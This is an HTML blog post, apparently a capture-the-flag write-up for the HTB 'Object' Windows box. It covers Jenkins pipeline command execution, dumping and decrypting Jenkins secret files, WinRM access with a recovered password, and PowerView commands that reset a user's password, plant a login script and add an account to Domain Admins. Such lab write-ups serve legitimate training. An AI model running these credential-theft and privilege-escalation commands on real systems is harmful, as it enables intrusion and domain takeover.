@@ -1,0 +1,417 @@
+<!doctype html>
+
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+<title>Object - HTBxUNI 2021 Quals &#8211; Joe Butler</title>
+<meta name="description" content="Website">
+<meta name="keywords" content="CTF, Medium box, Active Directory, Jenkins, Bloodhound">
+
+<!-- MathJax -->
+<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Object - HTBxUNI 2021 Quals">
+<meta property="og:description" content="Website">
+<meta property="og:url" content="/2021/12/02/ObjectHTB.html">
+<meta property="og:site_name" content="Joe Butler">
+
+
+
+
+
+<link rel="canonical" href="/2021/12/02/ObjectHTB.html">
+
+
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+
+
+    <br>
+    <center>
+        <span class="main-header-image">
+            <h1 style="font-weight:100; font-kerning:normal"><a href="/">Joe Butler</a></h1>
+        </span>
+    </center>
+
+    <!-- NAVIGATION -->
+    <br>
+    <center>
+    <nav class="header-nav">
+        <ul class="navigation-bar">
+            <li><a href="/">HOME</a></li>
+            <li><a href="/tags/">TAGS</a></li>
+            <li><a href="/about/">ABOUT</a></li>
+            <li><a href="/search/">SEARCH</a></li>
+        </ul>
+    </nav>
+</center>
+
+</head>
+
+<!-- BODY -->
+<body id="post-index">
+
+    <!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+    <script src="/assets/js/scrollToTop.js"></script>
+    <script>addBackToTop({
+      diameter: 32,
+      backgroundColor: 'rgb(51,51,51)',
+      textColor: '#fff'
+    })</script>
+  
+    <div id="main" role="main">
+        <article class="hentry">
+
+            <div class="featured-image">
+            </div>
+            <br />
+            <!-- MAIN -->
+            <h1 class="entry-title">
+                Object - HTBxUNI 2021 Quals
+            </h1>
+            <h3 class="entry-subtitle">
+                
+              
+            </h3>
+            
+            <hr>
+          
+            <!-- POST CONTENT -->
+            <div class="entry-content">
+                <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#summary">Summary</a></li>
+<li class="toc-entry toc-h1"><a href="#enumeration">Enumeration</a></li>
+<li class="toc-entry toc-h1"><a href="#user">User</a></li>
+<li class="toc-entry toc-h1"><a href="#pivoting">Pivoting</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#jenkins-password-recovery">Jenkins password recovery</a></li>
+<li class="toc-entry toc-h2"><a href="#bloodhound">Bloodhound</a></li>
+<li class="toc-entry toc-h2"><a href="#smith-exploitation">Smith Exploitation</a></li>
+<li class="toc-entry toc-h2"><a href="#maria-exploitation">Maria exploitation</a></li>
+<li class="toc-entry toc-h2"><a href="#path-to-domain-admins">Path to Domain Admins</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#root">Root</a></li>
+</ul><h1 id="summary">
+<a class="anchor" href="#summary" aria-hidden="true"><span class="octicon octicon-link"></span></a>Summary</h1>
+<p>The box starts off with an exposed Jenkins instance. Though exploiting a Jenkins pipeline, we can achieve RCE. By decrypting encrypted Jenkins credentials, we can use WinRM to get a shell. We can then pivot through various users on the box using data gathered by Bloodhound to gain access as Domain Admin.</p>
+
+<h1 id="enumeration">
+<a class="anchor" href="#enumeration" aria-hidden="true"><span class="octicon octicon-link"></span></a>Enumeration</h1>
+<p>Starting with a basic nmap:</p>
+
+<p><img src="https://i.imgur.com/pEQmtLh.png" alt="nmap.png"></p>
+
+<p>Port 80 and 8080 both appear to have web-servers running with one (port 80) using IIS (so this machine is likely a windows machine) and the other (8080) appearing to run a Jenkins instance.</p>
+
+<p>Port 5985 is most likely WinRM which might come into use later to get a shell on the box.</p>
+
+<p>Looking at the website on port 80:</p>
+
+<p><img src="https://i.imgur.com/uBlwbgu.png" alt="80.png"></p>
+
+<p>There’s not much to this page however the link to the automation server lists:</p>
+
+<p><img src="https://i.imgur.com/ZPOA5Rm.png" alt="link.png"></p>
+
+<p>Of course, this will not resolve using DNS so I will add it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so I can browse to it. When doing so, a page is presented:</p>
+
+<p><img src="https://i.imgur.com/w9knQBp.png" alt="jenkins.png"></p>
+
+<p>This is the same page that is running on port 8080 so adding the hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> wasn’t entirely necessary. After trying some basic credentials (like <code class="language-plaintext highlighter-rouge">admin:admin</code>) and having no luck, an account can be created to gain access:</p>
+
+<p><img src="https://i.imgur.com/N1M1SDR.png" alt="signup.png"></p>
+
+<p>and logging in shows:</p>
+
+<p><img src="https://i.imgur.com/mRz0Ttx.png" alt="loggedin.png"></p>
+
+<p>So it appears to be a typical Jenkins instance. If this instance is configured the same way as most, there’s a possibility that by creating a new pipeline, command execution could be obtained.</p>
+
+<h1 id="user">
+<a class="anchor" href="#user" aria-hidden="true"><span class="octicon octicon-link"></span></a>User</h1>
+
+<p>Creating a pipeline can usually be an entrypoint to command execution. Starting by creating a new job with a pipeline:</p>
+
+<p><img src="https://i.imgur.com/CVOkafu.png" alt="pipeline.png"></p>
+
+<p>Scripts can be configured for this pipeline:</p>
+
+<p><img src="https://i.imgur.com/3JKPuPJ.png" alt="script.png"></p>
+
+<p>To find if this is truly command execution, a simple payload can be used:</p>
+
+<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pipeline</span> <span class="o">{</span>
+    <span class="n">agent</span> <span class="n">any</span>
+
+    <span class="n">stages</span> <span class="o">{</span>
+        <span class="n">stage</span><span class="o">(</span><span class="s1">'command_execution'</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">steps</span> <span class="o">{</span>
+                <span class="n">bat</span> <span class="s1">'whoami'</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>And to trigger the pipeline to run the command, a build trigger can be added:</p>
+
+<p><img src="https://i.imgur.com/tmQ4YTe.png" alt="buildtrigger.png"></p>
+
+<p>After saving the pipeline and triggering the pipeline by browsing to <code class="language-plaintext highlighter-rouge">http://object.htb:8080/job/test%20pipeline/build?token=trigger</code>, the build can be seen:</p>
+
+<p><img src="https://i.imgur.com/ILWW9Ww.png" alt="built.png"> and the output can be seen by clicking on the <code class="language-plaintext highlighter-rouge">#1</code> which shows:</p>
+
+<p><img src="https://i.imgur.com/zK4WbpG.png" alt="rce.png"></p>
+
+<p>Success! It’s possible that this is enough to get the user flag so a simple check:</p>
+
+<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pipeline</span> <span class="o">{</span>
+    <span class="n">agent</span> <span class="n">any</span>
+
+    <span class="n">stages</span> <span class="o">{</span>
+        <span class="n">stage</span><span class="o">(</span><span class="s1">'command_execution'</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">steps</span> <span class="o">{</span>
+                <span class="n">bat</span> <span class="s1">'dir C:\\Users\\oliver\\Desktop'</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>And triggering again shows:</p>
+
+<p><img src="https://i.imgur.com/W6P8XPG.png" alt="dir.png"></p>
+
+<p>Reading this file does indeed return the user flag:</p>
+
+<p><img src="https://i.imgur.com/zeJ61Ri.png" alt="user.png"></p>
+
+<p><code class="language-plaintext highlighter-rouge">HTB{c1_cd_c00k3d_up_1337!}</code></p>
+
+<h1 id="pivoting">
+<a class="anchor" href="#pivoting" aria-hidden="true"><span class="octicon octicon-link"></span></a>Pivoting</h1>
+
+<p>After doing some quick enumeration, it’s clear that a shell would be prefereable to repeatedly configuring the pipeline, triggering it and waiting for the code to execute.</p>
+
+<p>Unfortunately this is difficult since without WinRM, the only port to gain a reverse shell with is UDP port 53 (DNS) which seems like more effort than it’s worth. One possible way in is to get credentials to use with WinRM, if there is password reuse with the Jenkins secret, this could be way to get a stable shell.</p>
+
+<h2 id="jenkins-password-recovery">
+<a class="anchor" href="#jenkins-password-recovery" aria-hidden="true"><span class="octicon octicon-link"></span></a>Jenkins password recovery</h2>
+
+<p>To do this, I can recover the Jenkins config files to use with <a href="https://github.com/tweksteen/jenkins-decrypt">jenkins-decrypt</a>.</p>
+
+<p>These can be found at:</p>
+
+<p><img src="https://i.imgur.com/kOrELlN.png" alt="configs.png"></p>
+
+<p>According to the script, 3 files need to be read:</p>
+
+<p><img src="https://i.imgur.com/Jk0jV7q.png" alt="filestoread.png"></p>
+
+<p>Assuming there’s slight file renaming, I can try and exfiltrate them. Reading the <code class="language-plaintext highlighter-rouge">hudson.util.Secret</code> returned garbled data since it’s likely raw bytes:</p>
+
+<p><img src="https://i.imgur.com/LPxc41h.png" alt="rawbytes.png"></p>
+
+<p>This can be base64 encoded to transfer the correct file. The payload can be seen below:</p>
+
+<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pipeline</span> <span class="o">{</span>
+    <span class="n">agent</span> <span class="n">any</span>
+
+    <span class="n">stages</span> <span class="o">{</span>
+        <span class="n">stage</span><span class="o">(</span><span class="s1">'command_execution'</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">steps</span> <span class="o">{</span>
+                <span class="n">bat</span> <span class="s1">'certutil.exe -encode C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\secrets\\hudson.util.Secret C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\secrets\\hudson.util.Secret.b64 &amp; type C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\secrets\\hudson.util.Secret.b64 &amp; type C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\secrets\\master.key &amp; type C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\users\\admin_17207690984073220035\\config.xml'</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+
+</code></pre></div></div>
+
+<p>The output of this is:</p>
+
+<p><img src="https://i.imgur.com/qxmXka0.png" alt="exfiltrated.png"></p>
+
+<p>After copying these to the relevant files, and decoding the secret:</p>
+
+<p><img src="https://i.imgur.com/js29Oog.png" alt="decodesecret.png"></p>
+
+<p>The python script can be ran. Initially, it gives an error:</p>
+
+<p><img src="https://i.imgur.com/0h6snNs.png" alt="pyscript.py"></p>
+
+<p>This can easily be fixed by and then ran successfully:</p>
+
+<p><img src="https://i.imgur.com/MLjgZxU.png" alt="success.png"></p>
+
+<p>Using this with evil-winrm:</p>
+
+<p><img src="https://i.imgur.com/bMxV9TX.png" alt="winrm.png"></p>
+
+<p>After some basic enumeration, I uploaded <code class="language-plaintext highlighter-rouge">SharpHound.exe</code> to find a path to domain admins:</p>
+
+<p><img src="https://i.imgur.com/heRDp7G.png" alt="sharphound.exe"></p>
+
+<h2 id="bloodhound">
+<a class="anchor" href="#bloodhound" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bloodhound</h2>
+
+<p>After importing this into bloodhound, the structure is somewhat messy. However, since we own oliver, a pre-built query can be used to show the shorted path to domain admin:</p>
+
+<p><img src="https://i.imgur.com/9q9cCof.png" alt="path.png"></p>
+
+<h2 id="smith-exploitation">
+<a class="anchor" href="#smith-exploitation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Smith Exploitation</h2>
+
+<p>So the first exploit to get control of Smith account is ForceChangePassword this means we can just change their password and log back in as that user:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="nf">\powerview.ps1</span><span class="w">
+
+</span><span class="c"># Create oliver's credential object</span><span class="w">
+</span><span class="nv">$oliverPas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'c1cdfun_d2434'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nv">$oliverCred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'object\oliver'</span><span class="p">,</span><span class="w"> </span><span class="nv">$oliverPas</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Overwrite smith's password</span><span class="w">
+</span><span class="nv">$smithPass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nf">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">smith</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$smithPass</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$oliverCred</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="https://i.imgur.com/PRP0x8a.png" alt="smith.png"></p>
+
+<h2 id="maria-exploitation">
+<a class="anchor" href="#maria-exploitation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Maria exploitation</h2>
+
+<p>Looking back at the bloodhound output, smith has <code class="language-plaintext highlighter-rouge">GenericWrite</code> over maria:</p>
+
+<p><img src="https://i.imgur.com/MZuAc69.png" alt="sMaria.png"></p>
+
+<p>Lots of time was wasted trying to abuse GenericWrite to get an encrypted kerberos TGT however it did not crack and wasn’t otherwise useful. The solution is to set a login script similarly to the method described by <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user">hacktricks</a>. Since powerview was already in use, the original script used to get control of smith’s account can be modified to run a custom login script using:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set maria's login script, it's being executed every minute</span><span class="w">
+</span><span class="nv">$smithCred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'object\smith'</span><span class="p">,</span><span class="w"> </span><span class="nv">$smithPass</span><span class="p">)</span><span class="w">
+</span><span class="nf">Set-DomainObject</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$smithCred</span><span class="w"> </span><span class="nt">-Set</span><span class="w"> </span><span class="p">@{</span><span class="s1">'scriptpath'</span><span class="o">=</span><span class="s1">'C:\Windows\System32\spool\drivers\color\payload.ps1'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The path listed is one readable by all users to eliminate the risk of the payload not working because the file isn’t readable as opposed to the exploit not working for other reasons. As a proof of concept, I can run <code class="language-plaintext highlighter-rouge">whoami</code> and have it output to a file:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">whoami</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-File</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\Windows\System32\spool\drivers\color\name.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Upon successful execution of the payload:</p>
+
+<p><img src="https://i.imgur.com/7Jxys4t.png" alt="payload.png"></p>
+
+<p>And after waiting a short while (around a minute) for it to be triggered (simulating a user logging onto the machine), the payload gets triggered and executed:</p>
+
+<p><img src="https://i.imgur.com/dY284Ta.png" alt="name.png"></p>
+
+<p>At this point, control over maria has been obtained however it was easy to get stuck here. With the firewall rules being so strict it was difficult to get a reverse shell as maria and alternatives such as <code class="language-plaintext highlighter-rouge">dnscat</code> were painfully slow - our attempts to abuse WriteOwner (escalation from maria to Domain Admins) failed after quite a while of trying. Doing enumeration through the payload script, a file command be found in maria’s desktop:</p>
+
+<p><img src="https://i.imgur.com/Z1xNIOd.png" alt="mariadesktop.png"></p>
+
+<p>After downloading the file with:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">cp</span><span class="w"> </span><span class="nx">C:\Users\maria\Desktop\Engines.xls</span><span class="w"> </span><span class="nx">C:\Windows\System32\spool\drivers\color</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And opening in Excel:</p>
+
+<p><img src="https://i.imgur.com/ba8Ge0k.png" alt="excel.png"></p>
+
+<p>There appears to be some passwords, of course, trying all of them might yield a log-on credential for maria. Indeed this is true:</p>
+
+<p><img src="https://i.imgur.com/39i3JZM.png" alt="marialogon.png"></p>
+
+<h2 id="path-to-domain-admins">
+<a class="anchor" href="#path-to-domain-admins" aria-hidden="true"><span class="octicon octicon-link"></span></a>Path to Domain Admins</h2>
+
+<p>Finally, using maria, the <code class="language-plaintext highlighter-rouge">WriteOwner</code> can be abused to gain access to Domain Admins:</p>
+
+<p><img src="https://i.imgur.com/2mUckt6.png" alt="aaaa.png"></p>
+
+<p>This means a user can be added to the <code class="language-plaintext highlighter-rouge">Domain Admins</code> group using a payload:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set maria as the owner of the Domain Admins group</span><span class="w">
+</span><span class="nf">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$mariaCred</span><span class="w">
+</span><span class="c"># Add ourselves all rights over the group</span><span class="w">
+</span><span class="nf">Add-DomainObjectAcl</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$mariaCred</span><span class="w">
+</span><span class="c"># Add oliver to the DA group</span><span class="w">
+</span><span class="nf">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="nx">oliver</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$mariaCred</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Running this:</p>
+
+<p><img src="https://i.imgur.com/T9aB3Lf.png" alt="ran.png"></p>
+
+<h1 id="root">
+<a class="anchor" href="#root" aria-hidden="true"><span class="octicon octicon-link"></span></a>Root</h1>
+
+<p>And then logging-out of oliver and logging back in shows that the exploit worked and <code class="language-plaintext highlighter-rouge">root.txt</code> can be obtained:</p>
+
+<p><img src="https://i.imgur.com/sueJ0HE.png" alt="root.png"></p>
+
+<p><code class="language-plaintext highlighter-rouge">HTB{br0k3n_4c3_4_d00r_t0_k1ngd0m}</code></p>
+
+            </div>
+
+            <!--- DIVIDING LINE -->
+            <hr />
+
+            <!-- POST TAGS -->
+            <div class="inline-tags">
+                <span>
+                    
+                        <a href="/tags/#CTF">#CTF&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Medium box">#Medium box&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Active Directory">#Active Directory&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Jenkins">#Jenkins&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Bloodhound">#Bloodhound&nbsp;&nbsp;&nbsp;</a>
+                    
+                </span>
+            </div>
+            <br />
+
+            <!-- POST DATE -->
+            <div class="post-date">
+                Dec 02, 2021 @ 00:02
+            </div>
+        </article>
+    </div>
+</body>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-wrapper">
+        <footer role="contentinfo">
+            <span>
+    &copy; 2021 Joe Butler.<br>Powered by <a target="_blank" href="https://jekyllrb.com" rel="nofollow noopener">Jekyll</a>
+</span>
+
+        </footer>
+    </div>
+</footer>
+</html>
